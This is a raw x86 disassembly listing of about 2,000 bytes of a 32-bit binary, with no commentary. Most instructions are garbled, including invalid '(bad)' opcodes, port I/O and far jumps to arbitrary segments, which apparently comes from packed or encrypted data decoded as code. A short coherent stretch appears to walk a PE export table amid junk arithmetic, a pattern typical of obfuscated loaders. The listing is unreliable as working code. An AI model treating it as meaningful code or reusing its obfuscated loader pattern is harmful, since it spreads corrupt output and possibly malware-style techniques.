  4140ac:	mov    esi,0xc7409ea6
  4140b1:	in     eax,dx
  4140b2:	dec    edi
  4140b3:	in     al,0x35
  4140b5:	push   0x3ec48f1b
  4140ba:	jmp    0x9b69:0xedd882c5
  4140c1:	loop   0x414142
  4140c3:	jbe    0x41411f
  4140c5:	and    esi,DWORD PTR [eax]
  4140c7:	xchg   ebx,eax
  4140c8:	mov    edi,0x3eb64621
  4140cd:	jb     0x4140db
  4140cf:	and    edi,esi
  4140d1:	test   DWORD PTR [edx],ebp
  4140d3:	xchg   ebx,eax
  4140d4:	ins    BYTE PTR es:[edi],dx
  4140d5:	push   esp
  4140d6:	sub    eax,0x96261b12
  4140db:	popa   
  4140dc:	dec    ebx
  4140dd:	adc    DWORD PTR [edi-0x13],ebp
  4140e0:	(bad)  
  4140e2:	add    eax,DWORD PTR [ebx]
  4140e4:	in     eax,0xbc
  4140e6:	ins    BYTE PTR es:[edi],dx
  4140e7:	jp     0x414102
  4140e9:	daa    
  4140ea:	jmp    0x3b4bf2cb
  4140ef:	push   es
  4140f0:	inc    esp
  4140f1:	adc    edi,DWORD PTR [ebp+ebx*4-0x76ab3758]
  4140f8:	pop    edi
  4140f9:	mov    al,ds:0x78dd8755
  4140fe:	cs mov edx,ebp
  414101:	cli    
  414102:	mov    WORD PTR [esi],?
  414104:	push   esi
  414105:	outs   dx,DWORD PTR ds:[esi]
  414106:	cld    
  414107:	clc    
  414108:	sbb    BYTE PTR ss:[ebp+0x622bed82],al
  41410f:	imul   ecx,DWORD PTR [ebx+0x30],0xffffffc6
  414113:	sub    DWORD PTR [edx],eax
  414115:	dec    ecx
  414116:	inc    esp
  414117:	pop    ecx
  414118:	aad    0x47
  41411a:	mov    ds:0xc0281bf6,eax
  41411f:	div    DWORD PTR [esp+eax*2-0x7fb479e0]
  414126:	sub    eax,DWORD PTR [ebp-0x3f]
  414129:	sti    
  41412a:	push   ebx
  41412b:	icebp  
  41412c:	mov    ecx,0x348dda00
  414131:	pop    esi
  414132:	xchg   esi,eax
  414133:	jmp    0xbb40bd47
  414138:	cmp    eax,0xee6cbddd
  41413d:	popf   
  41413e:	scas   al,BYTE PTR es:[edi]
  41413f:	cmp    eax,0x34ce1f2d
  414144:	out    dx,al
  414145:	cdq    
  414146:	push   ss
  414147:	mov    eax,0xb2a85bf3
  41414c:	gs enter 0xa90,0xa4
  414151:	pop    ds
  414152:	xchg   edx,eax
  414153:	ret    0x99d1
  414156:	lahf   
  414157:	retf   
  414158:	jg     0x4141a2
  41415a:	in     al,dx
  41415b:	xchg   esp,eax
  41415c:	or     DWORD PTR [ebx-0x7e13ba75],0x25
  414163:	aad    0xfc
  414165:	inc    edx
  414166:	add    BYTE PTR [eax],al
  414168:	add    BYTE PTR [eax],al
  41416a:	add    BYTE PTR [ebx+0x42fcd50d],cl
  414170:	add    BYTE PTR [ecx-0x77],al
  414173:	or     eax,0x42fcd5
  414178:	cmp    DWORD PTR ds:0x42fcd5,0x2c
  41417f:	jne    0x41418b
  414185:	call   DWORD PTR ds:0x42e56f
  41418b:	cmp    DWORD PTR ds:0x42fcd5,0x1e
  414192:	jb     0x41416b
  414198:	mov    ecx,DWORD PTR [ebp+0x8]
  41419b:	or     DWORD PTR ds:0x42fcd9,0x46b9
  4141a5:	add    ecx,DWORD PTR [eax+0x20]
  4141a8:	mov    DWORD PTR [ebp-0x28],ecx
  4141ab:	or     eax,DWORD PTR ds:0x42e6ff
  4141b1:	mov    eax,DWORD PTR [ebp-0x14]
  4141b4:	mov    ecx,DWORD PTR ds:0x42fce9
  4141ba:	sbb    DWORD PTR ds:0x42fcd5,ecx
  4141c0:	mov    ecx,DWORD PTR [ebp+0x8]
  4141c3:	add    DWORD PTR ds:0x42fd05,0x42e713
  4141cd:	add    ecx,DWORD PTR [eax+0x24]
  4141d0:	add    DWORD PTR ds:0x42e6eb,edi
  4141d6:	mov    DWORD PTR [ebp-0x2c],ecx
  4141d9:	mov    eax,DWORD PTR [ebp-0x14]
  4141dc:	mov    ecx,DWORD PTR [ebp+0x8]
  4141df:	add    ecx,DWORD PTR [eax+0x1c]
  4141e2:	neg    eax
  4141e4:	xor    esi,esi
  4141e6:	and    DWORD PTR ds:0x42fd05,ebx
  4141ec:	mov    DWORD PTR [ebp-0x14],ecx
  4141ef:	or     DWORD PTR ds:0x42e70f,ecx
  4141f5:	mov    eax,DWORD PTR [ebp-0x28]
  4141f8:	and    DWORD PTR ds:0x42fcdd,0x0
  414202:	mov    ecx,DWORD PTR ds:0x42fcdd
  414208:	inc    ecx
  414209:	mov    DWORD PTR ds:0x42fcdd,ecx
  41420f:	cmp    DWORD PTR ds:0x42fcdd,0xc
  414216:	jne    0x41423b
  41421c:	push   DWORD PTR [ebp-0x18]
  41421f:	push   DWORD PTR [ebp-0x10]
  414222:	push   0x25b2
  414227:	push   DWORD PTR [ebp-0x10]
  41422a:	push   0x5d78
  41422f:	push   DWORD PTR [ebp-0x24]
  414232:	push   DWORD PTR [ebp-0x10]
  414235:	call   DWORD PTR ds:0x42e573
  41423b:	cmp    DWORD PTR ds:0x42fcdd,0xb
  414242:	jne    0x414257
  414248:	xor    ecx,ecx
  41424a:	add    ecx,DWORD PTR ds:0x42fcdd
  414250:	inc    ecx
  414251:	mov    DWORD PTR ds:0x42fcdd,ecx
  414257:	cmp    DWORD PTR ds:0x42fcdd,0x14
  41425e:	jb     0x414202
  414264:	mov    ecx,DWORD PTR [ebp+0x8]
  414267:	add    ecx,DWORD PTR [eax+edi*4]
  41426a:	lea    eax,[ebp-0x8]
  41426d:	mov    DWORD PTR [ebp-0x30],ecx
  414270:	push   eax
  414271:	jmp    0x414555
  414276:	add    ebx,0xffffff97
  414279:	xor    eax,0x71a17157
  41427e:	inc    edx
  41427f:	cld    
  414280:	xchg   ebx,eax
  414281:	loop   0x414282
  414283:	call   0x7070:0x7380391c
  41428a:	mov    ecx,0xa670707e
  41428f:	sbb    DWORD PTR [ebx+0x7620157],esp
  414295:	mov    dh,dl
  414297:	and    eax,0x5a8f6784
  41429c:	adc    ebp,eax
  41429e:	in     al,0x9b
  4142a0:	pop    ebp
  4142a1:	xor    eax,ebp
  4142a3:	mov    eax,0xa02b74bb
  4142a8:	add    al,0x4f
  4142aa:	into   
  4142ab:	pop    es
  4142ac:	imul   ecx,DWORD PTR [edi],0xffffff88
  4142af:	mov    bh,0xa7
  4142b1:	or     edi,DWORD PTR [esi]
  4142b3:	cld    
  4142b4:	stc    
  4142b5:	dec    ebp
  4142b6:	push   edx
  4142b7:	mov    ds:0xd9b1d451,al
  4142bc:	cmp    dh,BYTE PTR [ecx+eax*8-0x5b]
  4142c0:	jmp    0xecca:0x483a9a34
  4142c7:	fidivr WORD PTR [ebp-0x87447c3]
  4142cd:	xor    edx,DWORD PTR [ebx+0x7864b653]
  4142d3:	pop    edi
  4142d4:	ja     0x414303
  4142d6:	xchg   edx,eax
  4142d7:	inc    eax
  4142d8:	loop   0x4142bd
  4142da:	in     al,0x1e
  4142dc:	jmp    0x41431f
  4142de:	fcmovnu st,st(7)
  4142e0:	imul   esp,DWORD PTR [edi],0x33833c74
  4142e6:	mov    ecx,0x7e761d6f
  4142eb:	aas    
  4142ec:	dec    esp
  4142ed:	dec    ecx
  4142ee:	pop    esp
  4142ef:	(bad)  [edx-0x43]
  4142f2:	add    DWORD PTR [esi-0x6f7107a7],edi
  4142f8:	cmc    
  4142f9:	fstp   TBYTE PTR [edx-0x58]
  4142fc:	cwde   
  4142fd:	mov    eax,ds:0x1024b203
  414302:	lods   al,BYTE PTR ds:[esi]
  414303:	lods   al,BYTE PTR ds:[esi]
  414304:	aas    
  414305:	add    al,0xe7
  414307:	push   esp
  414308:	jl     0x414296
  41430a:	adc    dl,dh
  41430c:	mov    bl,cl
  41430e:	or     ch,BYTE PTR [ecx]
  414310:	push   esi
  414311:	fmul   QWORD PTR [ebp+0x2]
  414314:	push   edx
  414315:	jge    0x414333
  414317:	push   ebp
  414318:	mov    eax,0x4953b492
  41431d:	or     eax,0x1877edcf
  414322:	lahf   
  414323:	imul   ebp,DWORD PTR [edi-0x55],0x51b908b6
  41432a:	and    eax,0xb7617620
  41432f:	leave  
  414330:	push   0x3feb854e
  414335:	adc    ebx,ecx
  414337:	push   ebp
  414338:	jo     0x414316
  41433a:	enter  0x1578,0x4c
  41433e:	test   al,0x7d
  414340:	xchg   ebx,eax
  414341:	clc    
  414342:	ds cs jmp 0x61b52f47
  414349:	out    0x92,al
  41434b:	ja     0x414311
  41434d:	mov    al,ds:0x2ff03235
  414352:	xor    BYTE PTR [edx],bl
  414354:	ss enter 0xfad,0x76
  414359:	push   0xffffff95
  41435b:	repnz xchg edx,eax
  41435d:	aas    
  41435e:	sbb    cl,al
  414360:	ins    DWORD PTR es:[edi],dx
  414361:	push   0xc64fbb00
  414366:	repnz xor al,0x20
  414369:	or     DWORD PTR [ecx-0x2619854b],edi
  41436f:	test   eax,0xa0883323
  414374:	and    eax,0x9833fd2a
  414379:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41437a:	jns    0x4143d7
  41437c:	add    DWORD PTR [eax+0x27],esi
  41437f:	cs mov ecx,0x3b3822e
  414385:	mov    edi,ecx
  414387:	scas   al,BYTE PTR es:[edi]
  414388:	sub    edi,ebp
  41438a:	mov    eax,eax
  41438c:	fldcw  WORD PTR [eax-0x15]
  41438f:	pop    ebp
  414390:	int    0x55
  414392:	and    esp,DWORD PTR gs:0x1a4e3c96
  414399:	in     eax,dx
  41439a:	out    dx,eax
  41439b:	bswap  edi
  41439d:	pop    eax
  41439e:	dec    ebp
  41439f:	inc    esi
  4143a0:	iret   
  4143a1:	inc    ebp
  4143a2:	sbb    BYTE PTR [ebx+ebp*4-0x9],al
  4143a6:	sbb    eax,DWORD PTR [eax+esi*8]
  4143a9:	pop    es
  4143aa:	mov    eax,0x7d17c2d7
  4143af:	mov    ds:0xe4ac4725,al
  4143b4:	mov    al,ds:0xffd94a9e
  4143b9:	sbb    al,0x10
  4143bb:	and    al,0x9f
  4143bd:	out    dx,eax
  4143be:	enter  0xbae5,0x42
  4143c2:	xchg   BYTE PTR [esi+0x4e],al
  4143c5:	and    BYTE PTR [esi+0x59ef3709],0x35
  4143cc:	add    al,0x4b
  4143ce:	jnp    0x414413
  4143d0:	jmp    0xd270:0x89c12e18
  4143d7:	ja     0x414416
  4143d9:	pop    esi
  4143da:	inc    ecx
  4143db:	mov    ecx,0x440e2552
  4143e0:	dec    ecx
  4143e1:	scas   eax,DWORD PTR es:[edi]
  4143e2:	pop    ss
  4143e3:	adc    edi,DWORD PTR [edi+0x12]
  4143e6:	add    al,0xa9
  4143e8:	add    al,0x85
  4143ea:	out    0x3a,eax
  4143ec:	push   edi
  4143ed:	jae    0x41441f
  4143ef:	mov    ss,WORD PTR [esi+0x69]
  4143f2:	mov    cl,0x87
  4143f4:	out    dx,al
  4143f5:	inc    edi
  4143f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4143f7:	ffreep st(0)
  4143f9:	xor    al,0x5a
  4143fb:	adc    ebp,DWORD PTR [esi]
  4143fd:	icebp  
  4143fe:	inc    esi
  4143ff:	jle    0x414385
  414401:	dec    esp
  414402:	retf   
  414403:	add    ebx,DWORD PTR [ecx-0x4ac260f2]
  414409:	fst    QWORD PTR [edx+0x207cceda]
  41440f:	add    dh,BYTE PTR [esi+0x72]
  414412:	sbb    al,0xce
  414414:	in     eax,0xce
  414416:	add    DWORD PTR [esi+0x417cda56],esp
  41441c:	mov    al,ds:0xdba7e7bb
  414421:	std    
  414422:	(bad)  
  414423:	fimul  WORD PTR [ecx]
  414425:	dec    ebp
  414426:	bnd jmp 0x4143c4
  414429:	xchg   edx,eax
  41442a:	(bad)  
  41442b:	retf   
  41442c:	add    BYTE PTR [ebx+ecx*8-0x40],0x6
  414431:	lock retf 0x94e4
  414435:	fiadd  DWORD PTR [bx]
  414438:	xchg   esi,eax
  414439:	(bad)  
  41443a:	cdq    
  41443b:	pushf  
  41443c:	inc    ebx
  41443d:	fisub  DWORD PTR [eax-0x7a]
  414440:	fist   DWORD PTR [esi+0x1ed26a85]
  414446:	stos   DWORD PTR es:[edi],eax
  414447:	inc    edi
  414448:	(bad)  
  414449:	cmp    eax,0xb2368db1
  41444e:	jo     0x414428
  414450:	ins    BYTE PTR es:[edi],dx
  414451:	xchg   esp,eax
  414452:	pop    esp
  414453:	mov    bh,0x30
  414455:	stos   DWORD PTR es:[edi],eax
  414456:	jmp    0xa852feea
  41445b:	stc    
  41445c:	cmp    ecx,0xcdf84fd7
  414462:	clc    
  414463:	add    al,0x99
  414465:	and    DWORD PTR [ebx+0x7a],esi
  414468:	shl    BYTE PTR [edx-0x80],cl
  41446b:	pop    si
  41446d:	xor    dh,bl
  41446f:	mov    al,ds:0xfc2dc695
  414474:	add    bh,bh
  414476:	pusha  
  414477:	push   ss
  414478:	jne    0x414437
  41447a:	add    al,BYTE PTR [edi+0x66]
  41447d:	lods   al,BYTE PTR ds:[esi]
  41447e:	nop
  41447f:	jg     0x414483
  414481:	mov    ebp,ss
  414483:	mov    ecx,0x6490a135
  414488:	cmp    bh,dl
  41448a:	inc    eax
  41448b:	outs   dx,BYTE PTR ds:[esi]
  41448c:	xor    dh,dh
  41448e:	bound  eax,QWORD PTR [edi-0x2afcc5b4]
  414494:	cld    
  414495:	pop    eax
  414496:	jnp    0x4144c6
  414498:	sbb    dl,BYTE PTR [esi]
  41449a:	pop    edi
  41449b:	ins    BYTE PTR es:[edi],dx
  41449c:	dec    esp
  41449d:	les    esp,FWORD PTR [ebp+0x3e8433bb]
  4144a3:	popa   
  4144a4:	retf   
  4144a5:	dec    ebp
  4144a6:	pop    ebp
  4144a7:	inc    ebp
  4144a8:	loop   0x4144e7
  4144aa:	adc    ah,0x90
  4144ad:	inc    edi
  4144ae:	div    WORD PTR cs:[eax+0xcde284b]
  4144b6:	shl    DWORD PTR [bp+di],cl
  4144b9:	jnp    0x41444e
  4144bb:	adc    bl,bh
  4144bd:	cmp    ecx,DWORD PTR [edi+0x5f]
  4144c0:	test   BYTE PTR [edi-0x14],bl
  4144c3:	push   0x65
  4144c5:	aad    0xeb
  4144c7:	inc    ebp
  4144c8:	popf   
  4144c9:	aas    
  4144ca:	push   es
  4144cb:	jo     0x41445e
  4144cd:	cmp    dl,bh
  4144cf:	dec    edi
  4144d0:	mov    al,BYTE PTR [esi+0x40cc1701]
  4144d6:	addr16 call 0xabd2206d
  4144dc:	cmc    
  4144dd:	xchg   BYTE PTR [edx+0x10eeb674],ch
  4144e3:	jp     0x414488
  4144e5:	pop    ecx
  4144e6:	jmp    0x41447e
  4144e8:	pushf  
  4144e9:	cmp    cl,BYTE PTR [esi+0x75]
  4144ec:	jne    0x414531
  4144ee:	pusha  
  4144ef:	xchg   DWORD PTR fs:[edi-0x20],ecx
  4144f3:	inc    edi
  4144f4:	and    BYTE PTR [eax+ebp*8-0xb6e824d],0x17
  4144fc:	pop    edi
  4144fd:	or     ah,BYTE PTR [edx]
  4144ff:	loopne 0x414558
  414501:	jns    0x4144c8
  414503:	sbb    ebp,DWORD PTR [eax]
  414505:	jmp    0xeef0:0xdf3eb38
  41450c:	out    dx,eax
  41450d:	packssdw mm1,QWORD PTR [ebp+eiz*1-0x57]
  414512:	test   BYTE PTR [edx],dh
  414514:	ret    0x608f
  414517:	xor    DWORD PTR [ebx],ecx
  414519:	sub    ebp,DWORD PTR [edx+0xb]
  41451c:	(bad)  
  41451d:	mov    ebx,0x65633388
  414522:	mov    eax,0xb78c17a1
  414527:	inc    BYTE PTR [eax-0x47]
  41452a:	aad    0x91
  41452c:	jge    0x41452b
  41452e:	shl    DWORD PTR [esp+eiz*2-0x78],0x85
  414533:	test   BYTE PTR [eax+0x16c9d7a3],0x77
  41453a:	mov    ds:0x70b56a27,al
  41453f:	(bad)  
  414540:	sub    dl,0x88
  414543:	push   esi
  414544:	ss rcl esi,1
  414547:	jnp    0x414588
  414549:	stc    
  41454a:	ret    0xad75
  41454d:	mov    ecx,0x84d1ef42
  414552:	pop    ebx
  414553:	rcr    BYTE PTR [ecx-0x1],cl
  414556:	jne    0x414528
  414558:	push   DWORD PTR [ebp+0xc]
  41455b:	call   0x4036c0
  414560:	mov    eax,DWORD PTR [ebp-0x4]
  414563:	jmp    0x414847
  414568:	ret    
  414569:	sbb    al,0xfd
  41456b:	sub    BYTE PTR [ebp-0x4f],ah
  41456e:	jno    0x41455b
  414570:	pop    ebx
  414571:	or     eax,0xb138beb4
  414576:	in     eax,dx
  414577:	bswap  ecx
  414579:	jo     0x4145fa
  41457b:	jo     0x414536
  41457d:	jle    0x4145ef
  41457f:	jo     0x414524
  414581:	mov    cl,0x5d
  414583:	aas    
  414584:	push   ebx
  414585:	push   0x64c33a4
  41458a:	mov    edi,0x9747dc45
  41458f:	clc    
  414590:	sbb    al,0xa2
  414592:	push   es
  414593:	loop   0x4145b4
  414595:	je     0x414602
  414597:	pop    esi
  414598:	add    bl,BYTE PTR [eax-0x70]
  41459b:	inc    ebp
  41459c:	jno    0x414609
  41459e:	int    0x78
  4145a0:	mov    DWORD PTR [ebx],ebx
  4145a2:	cmp    edi,DWORD PTR [edi-0x334be2bc]
  4145a8:	fsubr  DWORD PTR [eax+ecx*2]
  4145ab:	add    bh,bl
  4145ad:	pop    esp
  4145ae:	(bad)  
  4145b0:	out    dx,al
  4145b1:	or     eax,0x4071af3c
  4145b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4145b7:	(bad)  
  4145b8:	in     eax,0x1d
  4145ba:	cwde   
  4145bb:	pop    ss
  4145bc:	clc    
  4145bd:	lock adc DWORD PTR ds:0x53ab9ae6,edi
  4145c4:	out    dx,al
  4145c5:	inc    edi
  4145c6:	sbb    al,0xa3
  4145c8:	cmp    eax,0x43c9d9eb
  4145cd:	cmp    ah,ch
  4145cf:	(bad)  
  4145d0:	cmc    
  4145d1:	(bad)  
  4145d2:	lds    ebp,FWORD PTR [ebx+esi*1+0x42dbe9e5]
  4145d9:	in     al,0xae
  4145db:	fcom   QWORD PTR [ebp+0xc]
  4145de:	pop    eax
  4145df:	fild   WORD PTR [ebx-0x66]
  4145e2:	cmp    BYTE PTR ds:0xe95a758d,al
  4145e8:	imul   ecx,DWORD PTR ds:0xd7e7fed2,0x57985327
  4145f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4145f3:	xchg   ecx,eax
  4145f4:	mov    bl,0x15
  4145f6:	pop    ss
  4145f7:	aad    0xa0
  4145f9:	test   DWORD PTR [ebx-0x6a],ebx
  4145fc:	sub    BYTE PTR [ebx-0x4f088616],bl
  414602:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414603:	pop    esp
  414604:	jns    0x414623
  414606:	add    cl,bh
  414608:	lods   eax,DWORD PTR ds:[esi]
  414609:	ss mov esi,0xb1ccc2a
  41460f:	inc    esi
  414610:	mov    edx,0x3cd76250
  414615:	sub    DWORD PTR [edx],esi
  414617:	jo     0x414603
  414619:	xlat   BYTE PTR ds:[ebx]
  41461a:	jmp    DWORD PTR [ebx]
  41461c:	and    BYTE PTR [ebx],ch
  41461e:	fistp  QWORD PTR [ebx-0x4831db34]
  414624:	or     BYTE PTR [esi+0x115e91dd],ch
  41462a:	pop    ebx
  41462b:	sbb    ch,BYTE PTR [ebx-0x30119298]
  414631:	add    al,0xf4
  414633:	nop
  414634:	jo     0x4145bc
  414636:	jo     0x414647
  414638:	jo     0x414646
  41463a:	fadd   DWORD PTR [ebx+ebp*8-0x335f67e5]
  414641:	jecxz  0x414674
  414643:	add    cl,BYTE PTR [eax]
  414645:	cmp    DWORD PTR [edx+0x6f],0x6f82e5a
  41464c:	add    dh,ah
  41464e:	les    ebp,FWORD PTR [edx+0x28]
  414651:	scas   al,BYTE PTR es:[edi]
  414652:	dec    ebp
  414653:	pop    ss
  414654:	cli    
  414655:	lods   al,BYTE PTR ds:[esi]
  414656:	inc    esp
  414657:	jg     0x41466d
  414659:	popf   
  41465a:	aad    0xd6
  41465c:	sbb    ah,ah
  41465e:	stos   BYTE PTR es:[edi],al
  41465f:	ds mov bl,0x38
  414662:	dec    esi
  414663:	inc    eax
  414664:	lahf   
  414665:	push   edx
  414666:	or     bh,bl
  414668:	sub    DWORD PTR [edi+0x18561bc2],edi
  41466e:	test   BYTE PTR [edx-0x2fbf2fa6],ch
  414674:	sub    ch,BYTE PTR [esi]
  414676:	pop    es
  414677:	fist   WORD PTR ds:[edx-0x1f]
  41467b:	ret    0x2a25
  41467e:	mov    ch,0xf7
  414680:	pop    esi
  414681:	(bad)  [esi]
  414683:	add    al,0x18
  414685:	imul   esi,DWORD PTR [eax],0x71
  414688:	in     al,dx
  414689:	outs   dx,DWORD PTR ds:[esi]
  41468a:	mov    eax,ds:0x69a028d4
  41468f:	cmp    edi,ebx
  414691:	shr    BYTE PTR [edx],0xf7
  414694:	retf   0x5248
  414697:	mov    BYTE PTR [ebp-0x558971],0xfd
  41469e:	fs cmc 
  4146a0:	ja     0x414698
  4146a2:	cmp    al,0x49
  4146a4:	aad    0x95
  4146a6:	cld    
  4146a7:	mov    esp,0x4469d44a
  4146ac:	push   cs
  4146ad:	dec    eax
  4146ae:	loop   0x41469e
  4146b0:	dec    edx
  4146b1:	push   eax
  4146b2:	and    eax,0x916cda2
  4146b7:	mov    bl,0x3f
  4146b9:	std    
  4146ba:	mov    gs,WORD PTR [ebp+edx*4-0x59f459bf]
  4146c1:	cld    
  4146c2:	xchg   si,ax
  4146c4:	or     al,0x55
  4146c6:	push   eax
  4146c7:	ret    
  4146c8:	dec    edx
  4146c9:	ss out dx,al
  4146cb:	arpl   WORD PTR [esi+0x435e3fa0],bp
  4146d1:	imul   eax,ecx,0x2ce9d649
  4146d7:	lods   eax,DWORD PTR ds:[esi]
  4146d8:	outs   dx,BYTE PTR ds:[esi]
  4146d9:	or     al,BYTE PTR [edx-0x68]
  4146dc:	xchg   BYTE PTR [ecx+0x3],ah
  4146df:	fsub   st,st(2)
  4146e1:	jo     0x414745
  4146e3:	add    ecx,esi
  4146e5:	or     al,0xd0
  4146e7:	jmp    0x4146d2
  4146e9:	inc    ecx
  4146ea:	lds    ebx,FWORD PTR [ecx-0x5]
  4146ed:	dec    edi
  4146ee:	pop    ebx
  4146ef:	fsub   QWORD PTR [edx+ebp*4]
  4146f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4146f3:	mov    dh,0xd6
  4146f5:	dec    esi
  4146f6:	std    
  4146f7:	hlt    
  4146f8:	mov    cl,0xfb
  4146fa:	sbb    DWORD PTR [ebp+0x30a42a72],edx
  414700:	cmp    BYTE PTR [ebx-0x33],al
  414703:	and    ecx,DWORD PTR [ecx+0x3a37adcb]
  414709:	jge    0x4146dd
  41470b:	jb     0x414779
  41470d:	pop    ss
  41470e:	or     ebx,DWORD PTR [edi]
  414710:	mov    ds:0x5dbe0716,eax
  414715:	mov    dh,0xf1
  414717:	mov    ds:0x778067d0,eax
  41471c:	xchg   edi,eax
  41471d:	(bad)  
  41471e:	ds xor eax,0x52acb8a9
  414724:	inc    edi
  414725:	and    bh,0xb8
  414728:	push   ebx
  414729:	sbb    eax,0x6d6f64ad
  41472e:	add    eax,0x7b014f45
  414733:	xor    eax,0x3f5921d7
  414738:	fs and al,0x75
  41473b:	(bad)  
  41473d:	adc    DWORD PTR [ebx-0x24301237],ecx
  414743:	imul   edi,DWORD PTR [edi-0x37],0x643a81c1
  41474a:	sti    
  41474b:	or     ebp,DWORD PTR [edi-0x54]
  41474e:	lea    ebx,[esi]
  414750:	jg     0x414779
  414752:	jno    0x41479d
  414754:	mov    eax,0x9b7d2124
  414759:	aas    
  41475a:	adc    bh,BYTE PTR [ecx+0x4d458dac]
  414760:	xchg   edi,eax
  414761:	cwde   
  414762:	ds jns 0x414796
  414765:	adc    eax,0x24dc5dd8
  41476a:	inc    esi
  41476b:	cld    
  41476c:	int    0x57
  41476e:	ficom  WORD PTR [ecx-0x4b]
  414771:	loope  0x414791
  414773:	js     0x41479b
  414775:	sub    bl,BYTE PTR [edx-0x9]
  414778:	inc    ebp
  414779:	fbstp  TBYTE PTR [ecx+0x2a]
  41477c:	push   esp
  41477d:	pop    esi
  41477e:	sahf   
  41477f:	int3   
  414780:	xchg   dl,bl
  414782:	out    0x4d,eax
  414784:	jnp    0x41479f
  414786:	(bad)  
  414787:	cmp    BYTE PTR ds:0x32107a5e,dl
  41478d:	out    0x3,eax
  41478f:	test   DWORD PTR [ecx*1-0x47b15e5e],eax
  414796:	jg     0x4147bb
  414798:	push   ds
  414799:	(bad)  
  41479a:	imul   ebp,DWORD PTR [eax+0x54],0x27
  41479e:	ins    BYTE PTR es:[edi],dx
  41479f:	test   BYTE PTR [ecx+0x3258dfe0],0xea
  4147a6:	cmp    eax,0x4cea6b0a
  4147ab:	in     eax,0x10
  4147ad:	outs   dx,DWORD PTR ds:[esi]
  4147ae:	adc    BYTE PTR [ecx],dl
  4147b0:	and    BYTE PTR [esi-0x3d],dl
  4147b3:	add    ebx,DWORD PTR [edi-0x161572]
  4147b9:	jae    0x4147f9
  4147bb:	dec    esi
  4147bc:	push   eax
  4147bd:	lds    esp,FWORD PTR [ebx-0x5e]
  4147c0:	outs   dx,DWORD PTR ds:[esi]
  4147c1:	and    eax,0xe8096beb
  4147c6:	inc    eax
  4147c7:	fnstsw WORD PTR [edi+0x233cf93e]
  4147cd:	loop   0x4147ac
  4147cf:	and    DWORD PTR [ebx+ecx*1-0x58],esp
  4147d3:	jg     0x41483b
  4147d5:	es jb  0x41478d
  4147d8:	cmp    esp,DWORD PTR [edx+0x3f]
  4147db:	std    
  4147dc:	jb     0x4147af
  4147de:	rol    edx,0xf2
  4147e1:	dec    ecx
  4147e2:	push   ds
  4147e3:	xor    al,0xe8
  4147e5:	adc    DWORD PTR [esi],0x4d
  4147e8:	and    DWORD PTR [ebp-0x52],esi
  4147eb:	adc    BYTE PTR [eax],ah
  4147ed:	rcl    DWORD PTR [esi-0x701c738d],0xad
  4147f4:	mov    al,ds:0xe24a33fc
  4147f9:	loopne 0x4147fe
  4147fb:	xlat   BYTE PTR ds:[ebx]
  4147fc:	stos   DWORD PTR es:[edi],eax
  4147fd:	cs jmp 0x7f485823
  414803:	adc    edi,DWORD PTR [ecx+0x3b]
  414806:	pushf  
  414807:	jl     0x414831
  414809:	inc    ecx
  41480a:	enter  0x46de,0x53
  41480e:	das    
  41480f:	fdiv   st(4),st
  414811:	jmp    DWORD PTR [ebp+0x377c8462]
  414817:	sti    
  414818:	jmp    0xceb7:0x2529e7f
  41481f:	mov    al,ds:0xe62b9cd1
  414824:	(bad)  
  414825:	mov    esp,0x3cb99ca6
  41482a:	xor    edx,DWORD PTR [esi-0x7b]
  41482d:	adc    eax,0xbd4cd496
  414832:	hlt    
  414833:	xchg   ebx,esi
  414835:	data16 mov dl,0xae
  414838:	aam    0x40
  41483a:	jmp    0x414816
  41483c:	xchg   ebx,eax
  41483d:	mov    ah,0xe2
  41483f:	stc    
  414840:	gs dec eax
  414842:	jno    0x414848
  414844:	or     al,0x14
  414846:	std    
  414847:	mov    ecx,DWORD PTR [ebp-0x8]
  41484a:	xor    eax,0x7510855
  41484f:	jmp    0x414b33
  414854:	add    eax,0xd5abd630
  414859:	mov    cl,0x61
  41485b:	jb     0x41489c
  41485d:	jge    0x41481b
  41485f:	jge    0x414833
  414861:	aam    0x5c
  414863:	adc    bh,BYTE PTR ss:[ebp+0x7f]
  414867:	jo     0x414822
  414869:	jle    0x4148db
  41486b:	jo     0x414829
  41486d:	arpl   ax,sp
  41486f:	mov    al,0xc3
  414871:	and    DWORD PTR [edx+0xc],edx
  414874:	(bad)  
  414875:	std    
  414876:	xor    DWORD PTR [edx+0x3361c070],0x727b7ba5
  414880:	daa    
  414881:	dec    ebx
  414882:	inc    ecx
  414883:	sti    
  414884:	test   al,0x46
  414886:	xor    edi,DWORD PTR [ebx]
  414888:	call   DWORD PTR [ebp-0xece7566]
  41488e:	mov    WORD PTR [ebx+0x5a],?
  414891:	xchg   edi,eax
  414892:	cmc    
  414893:	(bad)  
  414894:	fisub  WORD PTR [ecx]
  414896:	retf   
  414897:	popa   
  414898:	mov    al,0xf5
  41489a:	mov    edi,0xc539a34e
  41489f:	xchg   ecx,eax
  4148a0:	jo     0x4148c2
  4148a2:	out    dx,al
  4148a3:	and    BYTE PTR [ecx-0x768fc7d4],0xe1
  4148aa:	xor    DWORD PTR [ebx+0x34e34518],0xffffffd7
  4148b1:	mov    cl,0xb4
  4148b3:	push   cs
  4148b4:	ror    dh,1
  4148b6:	cmc    
  4148b7:	fdivr  DWORD PTR [edi+0x2abfae35]
  4148bd:	xor    DWORD PTR [eax],ecx
  4148bf:	and    dh,0xb9
  4148c2:	retf   
  4148c3:	cmp    eax,0x1d4f3d01
  4148c8:	stos   BYTE PTR es:[edi],al
  4148c9:	cmp    ebx,esp
  4148cb:	mov    ch,0x41
  4148cd:	stos   DWORD PTR es:[edi],eax
  4148ce:	mov    esp,0x8def99f8
  4148d3:	frstpm(287 only) 
  4148d5:	xchg   edx,eax
  4148d6:	sbb    BYTE PTR [esi-0x7fa29d16],al
  4148dc:	xor    DWORD PTR [esi],edi
  4148de:	inc    ecx
  4148df:	lock sub al,0x61
  4148e2:	inc    esi
  4148e3:	shr    eax,0xfc
  4148e6:	jo     0x41493b
  4148e8:	leave  
  4148e9:	sbb    esi,DWORD PTR [eax-0x1f]
  4148ec:	mov    al,ds:0xa81a5a94
  4148f1:	call   0x1f54:0x86298db
  4148f8:	cdq    
  4148f9:	cmp    eax,0x8caf0ed3
  4148fe:	(bad)  [edx-0x42]
